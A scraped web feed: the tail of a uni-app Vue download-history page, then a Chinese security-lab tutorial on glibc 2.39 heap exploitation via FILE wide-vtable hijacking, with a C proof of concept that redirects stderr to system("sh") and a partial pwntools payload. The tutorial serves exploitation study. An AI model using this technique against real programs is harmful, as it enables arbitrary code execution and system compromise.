    <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
    <span class="hljs-attr">pageNum</span>: pageNo,
    pageSize,
  };
  <span class="hljs-keyword">const</span> token = uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">'token'</span>);
  <span class="hljs-keyword">if</span> (token) {
    <span class="hljs-title function_">queryDownload</span>(params, token)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
        <span class="hljs-comment">// å°†è¯·æ±‚çš„ç»“æœæ•°ç»„ä¼ é€’ç»™z-paging</span>
        paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">complete</span>(res.<span class="hljs-property">rows</span>);
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
        <span class="hljs-comment">// å¦‚æœè¯·æ±‚å¤±è´¥å†™paging.value.complete(false);</span>
        <span class="hljs-comment">// æ³¨æ„ï¼Œæ¯æ¬¡éƒ½éœ€è¦åœ¨catchä¸­å†™è¿™å¥è¯å¾ˆéº»çƒ¦ï¼Œz-pagingæä¾›äº†æ–¹æ¡ˆå¯ä»¥å…¨å±€ç»Ÿä¸€å¤„ç†</span>
        <span class="hljs-comment">// åœ¨åº•å±‚çš„ç½‘ç»œè¯·æ±‚æŠ›å‡ºå¼‚å¸¸æ—¶ï¼Œå†™uni.$emit('z-paging-error-emit');å³å¯</span>
        paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">false</span>);
      });
  }
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">selectClass</span>(<span class="hljs-params">event</span>) {
  resourceClass.<span class="hljs-property">value</span> = event.<span class="hljs-property">detail</span>;
  paging.<span class="hljs-property">value</span>.<span class="hljs-title function_">reload</span>(); <span class="hljs-comment">// åˆ·æ–°åˆ†é¡µ</span>
}

<span class="hljs-comment">// å‰å¾€ä¸‹è½½åˆ—è¡¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toDownloadList</span>(<span class="hljs-params">item</span>) {
  uni.<span class="hljs-title function_">navigateTo</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/downloadList/index'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      res.<span class="hljs-property">eventChannel</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'recordFolder'</span>, item);
    },
  });
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.downloadHistory</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

<span class="hljs-selector-class">.downloadCollection</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">130</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8</span>rpx;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: flex-start;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30</span>rpx;
  &amp;<span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30</span>rpx;
  }
}

<span class="hljs-selector-class">.downloadCard</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.picInfo</span> {
  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.picTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">50</span>rpx;
}

<span class="hljs-selector-class">.picNum</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
}

<span class="hljs-selector-class">.mr-20</span> {
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.loading-status</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40</span>rpx <span class="hljs-number">0</span>;
}
<span class="hljs-selector-class">.no-more</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">24</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40</span>rpx;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

</code></pre>
<p>å‚è€ƒæ–‡æ¡£</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fcomponent%2Fscroll-view.html%23scroll-view" target="_blank" title="https://uniapp.dcloud.net.cn/component/scroll-view.html#scroll-view" ref="nofollow noopener noreferrer">uniapp.dcloud.net.cn/component/sâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fz-paging.zxlee.cn%2F" target="_blank" title="https://z-paging.zxlee.cn/" ref="nofollow noopener noreferrer">z-paging.zxlee.cn/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æµ…è°ˆglibc2.39ä¸‹çš„å †åˆ©ç”¨]]></title>    <link>https://juejin.cn/post/7576929700842864649</link>    <guid>https://juejin.cn/post/7576929700842864649</guid>    <pubDate>2025-11-27T07:44:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842864649" data-draft-id="7577189654488383538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æµ…è°ˆglibc2.39ä¸‹çš„å †åˆ©ç”¨"/> <meta itemprop="keywords" content="é»‘å®¢"/> <meta itemprop="datePublished" content="2025-11-27T07:44:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èšæ™¯ç½‘å®‰å®éªŒå®¤"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521018846"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æµ…è°ˆglibc2.39ä¸‹çš„å †åˆ©ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521018846/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èšæ™¯ç½‘å®‰å®éªŒå®¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:44:23.000Z" title="Thu Nov 27 2025 07:44:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨<code>glibc2.34</code>ä»¥åå–æ¶ˆäº†<code>__free_hook</code>ä»¥åŠ<code>__malloc_hook</code>ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„å‡½æ•°æŒ‡é’ˆä»£æ›¿<code>__free_hook</code>ä»¥åŠ<code>__malloc_hook</code>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">struct _IO_FILE_plus
{
    _IO_FILE    file<span class="hljs-comment">;</span>
    IO_jump_t   *vtable<span class="hljs-comment">;</span>
}
</code></pre>
<p>åœ¨ç»“æ„ä½“<code>_IO_FILE_plus</code>ä¸­å­˜åœ¨ç€ç±»ä¼¼äºè™šè¡¨çš„å˜é‡<code>vtable</code>ï¼Œå…¶ä¸­å­˜å‚¨ç€è®¸å¤šå‡½æ•°æŒ‡é’ˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c12924f67be47cf9e46c1a215d50504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=FmRNQewyHCJBmOx0xuRVWlozfvM%3D" alt="image-20251009194102943" loading="lazy"/></p>
<p>è‹¥èƒ½ä¿®æ”¹<code>vtable</code>æŒ‡é’ˆå¹¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„<code>vtable</code>ï¼Œå³å¯è¾¾æˆåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹çš„ç›®çš„ã€‚</p>
<p>ä½†æ˜¯åœ¨<code>glibc2.24</code>ä¹‹ååŠ å…¥äº†<code>vtable</code>æŒ‡é’ˆçš„æ ¡éªŒï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¼šæ£€æµ‹<code>vtable</code>æŒ‡é’ˆæ˜¯å¦åœ¨èŒƒå›´ä¹‹å†…ã€‚å› æ­¤åœ¨<code>glibc2.24</code>ä¹‹åï¼Œéœ€è¦æ‰¾åœ¨èŒƒå›´å†…çš„<code>vtable</code>æŒ‡é’ˆåŠ ä»¥åˆ©ç”¨ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *
<span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span>
{
  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<span class="hljs-comment">//è®¡ç®—åœ¨glibcä¸­vtableæŒ‡é’ˆçš„èŒƒå›´</span>
  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;
  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables; <span class="hljs-comment">//åˆ¤æ–­å½“å‰vtableæŒ‡é’ˆä¸èµ·å§‹ä½ç½®çš„åç§»</span>
  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//è‹¥åç§»å¤§äºæœ€å¤§è·ç¦»åˆ™æ ¡éªŒå¤±è´¥</span>
    _IO_vtable_check ();
  <span class="hljs-keyword">return</span> vtable;
}
</code></pre>
<p>åœ¨<code>glibc</code>èŒƒå›´å†…å­˜åœ¨ç€åä¸º<code>_IO_wfile_jumps</code>çš„<code>vtable</code>æŒ‡é’ˆã€‚è¯¥è·³è½¬è¡¨ä¸­å­˜åœ¨ç€ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°<code>_IO_wfile_overflow</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4764f6fff25449c1843d4603048c9663~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=TdFT3hkDGLjGUvW1g5yrJEvHkWA%3D" alt="image-20251009195029742" loading="lazy"/></p>
<p>è°ƒç”¨æµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼Œç®€å•æ¥è®²<code>_IO_wfile_overflow</code>æœ€ç»ˆè°ƒç”¨çš„æ˜¯<code>_IO_wdoallocbuf</code>å°†å®æ‹†è§£ï¼Œå®é™…æœ€ç»ˆè°ƒç”¨çš„æ˜¯<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>ï¼Œè€Œåœ¨è°ƒç”¨<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>çš„æ—¶å€™å¹¶æ²¡æœ‰æ£€æµ‹<code>vtable</code>çš„åˆæ³•æ€§ï¼Œå› æ­¤å€˜è‹¥æˆ‘ä»¬èƒ½å¤Ÿä¼ªé€ <code>__wide_data</code>å°±èƒ½å¤Ÿæ§åˆ¶<code>_wide_vtable</code>å˜é‡ï¼Œæœ€åå°†è¯¥è·³è½¬è¡¨å†…å®¹ä¿®æ”¹ä¸º<code>system</code>ï¼Œå³å¯å®Œæˆç¨‹åºæµç¨‹çš„åŠ«æŒã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/*
_IO_wfile_overflow
	=&gt; _IO_wdoallocbuf
		=&gt; _IO_WDOALLOCATE
*/</span>

wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  <span class="hljs-comment">//#define _IO_NO_WRITES         0x0008</span>
  <span class="hljs-comment">//f-&gt;_flags &amp; _IO_NO_WRITES == 0</span>
  if (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span>
    {
      f-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  <span class="hljs-comment">//#define _IO_CURRENTLY_PUTTING 0x0800</span>
  <span class="hljs-comment">//f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</span>
  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span>)
    {
      <span class="hljs-comment">//f-&gt;_wide_data-&gt;_IO_write_base == 0</span>
      if (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)
	{
      <span class="hljs-comment">//æ»¡è¶³ä¸Šè¿°æ¡ä»¶æ‰§è¡Œfp-&gt;_wide_data-&gt;_wide_vtable</span>
	  _IO_wdoallocbuf (f);
	  ...

void
_IO_wdoallocbuf (FILE *fp)
{
  <span class="hljs-comment">//fp-&gt;_wide_data-&gt;_IO_buf_base == 0</span>
  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
    return;
  <span class="hljs-comment">//#define _IO_UNBUFFERED        0x0002</span>
  <span class="hljs-comment">//fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</span>
  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  ...

<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WDOALLOCATE</span>(FP) WJUMP0 (__doallocate, FP)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">WJUMP0</span>(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WIDE_JUMPS_FUNC</span>(THIS) <span class="hljs-built_in">_IO_WIDE_JUMPS</span>(THIS)
<span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_WIDE_JUMPS</span>(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</code></pre>
<p>æ ¹æ®ä¸Šè¿°æºç æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæƒ³è¦æ‰§è¡Œ<code>_IO_wdoallocbuf</code>éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶</p>
<ul>
<li>
<p><code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code></p>
</li>
<li>
<p><code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code></p>
</li>
<li>
<p><code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code></p>
</li>
</ul>
<p>æƒ³è¦è®©ç¨‹åºæ‰§è¡Œ<code>_IO_wfile_overflow</code>å‡½æ•°éœ€è¦è§¦å‘ä»¥ä¸‹è°ƒç”¨é“¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6810bd513263401e98bdacc89ec1455f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=6VE165rNv6nTi5ZpqmwNxNU9eOc%3D" alt="image-20251009221543800" loading="lazy"/></p>
<p><code>_IO_cleanup</code>å‡½æ•°çš„ä½œç”¨æ˜¯æ¸…ç†æ‰€æœ‰æ‰“å¼€çš„æ ‡å‡†<code>I/O</code>æµï¼Œå› æ­¤åœ¨ç¨‹åºé€€å‡ºæ—¶å°±ä¼šè°ƒç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bddb096fb81c4da69ec2718826bd2a7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=TFs0v1EF6x4KaPxC9%2FsX1jW415g%3D" alt="image-20251009221812005" loading="lazy"/></p>
<p><code>_IO_cleanup</code>å‡½æ•°è°ƒç”¨å¦‚ä¸‹æ‰€ç¤ºï¼Œå®é™…å†…éƒ¨æ‰§è¡Œçš„å‡½æ•°ä¸º<code>_IO_flush_all</code></p>
<pre><code class="hljs language-rust" lang="rust">int
_IO_cleanup (void)
{
    ...
  int result = _IO_flush_all ();
    ...
}

int
_IO_flush_all (void)
{
    ...
  <span class="hljs-title function_ invoke__">for</span> (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp<span class="hljs-punctuation">-&gt;</span>_chain)
    {
      ...
      <span class="hljs-title function_ invoke__">if</span> (((fp<span class="hljs-punctuation">-&gt;</span>_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp<span class="hljs-punctuation">-&gt;</span>_IO_write_ptr &gt; fp<span class="hljs-punctuation">-&gt;</span>_IO_write_base)
	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span>
	       &amp;&amp; fp<span class="hljs-punctuation">-&gt;</span>_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp<span class="hljs-punctuation">-&gt;</span>_wide_data<span class="hljs-punctuation">-&gt;</span>_IO_write_ptr
				    &gt; fp<span class="hljs-punctuation">-&gt;</span>_wide_data<span class="hljs-punctuation">-&gt;</span>_IO_write_base))
	   )
	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
          ...
}
</code></pre>
<p><code>_IO_list_all</code>æ‰§è¡Œçš„åˆ—è¡¨é¡ºåºä¸º<code>stderr-&gt;stdout-&gt;stdin</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹<code>stderr-&gt;_wide_data</code>ä¸<code>stderr-&gt;vtable</code>å°±å¯ä»¥ä¼˜å…ˆè§¦å‘åˆ©ç”¨é“¾ï¼Œä½†æ˜¯ä¾æ—§éœ€è¦æ»¡è¶³ä»¥ä¸‹é™åˆ¶æ¡ä»¶ï¼š</p>
<ul>
<li>
<p><code>fp-&gt;_mode == 0</code></p>
</li>
<li>
<p><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
</li>
</ul>
<h2 data-id="heading-0">POC</h2>
<p>æ ¹æ®ä¸Šè¿°æ¡ä»¶ï¼Œæ€»ç»“<code>POC</code>å¦‚ä¸‹</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> {</span>
    <span class="hljs-type">void</span> *funcs[<span class="hljs-number">27</span>]; <span class="hljs-comment">// ä¼ªå ä½ï¼Œä¸åŒglibcç‰ˆæœ¬å¯èƒ½ä¸åŒ</span>
};
<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> {</span>
    FILE file;
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span>
};
<span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span>;</span>
<span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span>;</span>
<span class="hljs-type">long</span>  *fake_IO_wide_data;
<span class="hljs-type">long</span> *fake_wide_vtable;
<span class="hljs-type">long</span> * p;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">//_IO_wide_dataç»“æ„å¤§å°ä¸º0xe8</span>
    fake_IO_wide_data = (<span class="hljs-type">long</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xe8</span>);
    <span class="hljs-comment">//è·³è½¬è¡¨ç»“æ„å¤§å°ä¸º0xe8</span>
    fake_wide_vtable = (<span class="hljs-type">long</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa8</span>);
    <span class="hljs-comment">//glibc2.39:_IO_wfile_jumps = _IO_file_jumps + 0x1f8</span>
    _IO_2_1_stderr_.vtable = (<span class="hljs-type">char</span> *)_IO_2_1_stderr_.vtable + <span class="hljs-number">0x1f8</span>;
    <span class="hljs-built_in">stderr</span>-&gt;_wide_data = fake_IO_wide_data;
    <span class="hljs-built_in">stderr</span>-&gt;_IO_write_ptr = <span class="hljs-number">1</span>;
    <span class="hljs-built_in">stderr</span>-&gt;_IO_write_base = <span class="hljs-number">0</span>;
    *(<span class="hljs-type">long</span> **)((<span class="hljs-type">char</span> *)fake_IO_wide_data + <span class="hljs-number">0xe0</span>) = fake_wide_vtable;
    *(<span class="hljs-type">long</span> **)((<span class="hljs-type">char</span> *)fake_wide_vtable + <span class="hljs-number">0x68</span>) = (<span class="hljs-type">long</span> *)system;
    <span class="hljs-comment">//0xfbadä¸ºé­”æ•°,0x0101æ˜¯ä¸ºäº†æ‹¼æ¥åç»­çš„shå­—ç¬¦ä¸²</span>
    <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">char</span> *)&amp;<span class="hljs-built_in">stderr</span>-&gt;_flags,<span class="hljs-string">"\x01\x01\xad\xfb;sh"</span>,<span class="hljs-number">8</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><code>python</code>è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment">#fake_wide_vtable(0xa8)</span>
<span class="hljs-attr">payload</span>  = b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x68 + p64(libcbase + libc.symbols[<span class="hljs-string">'system'</span>])
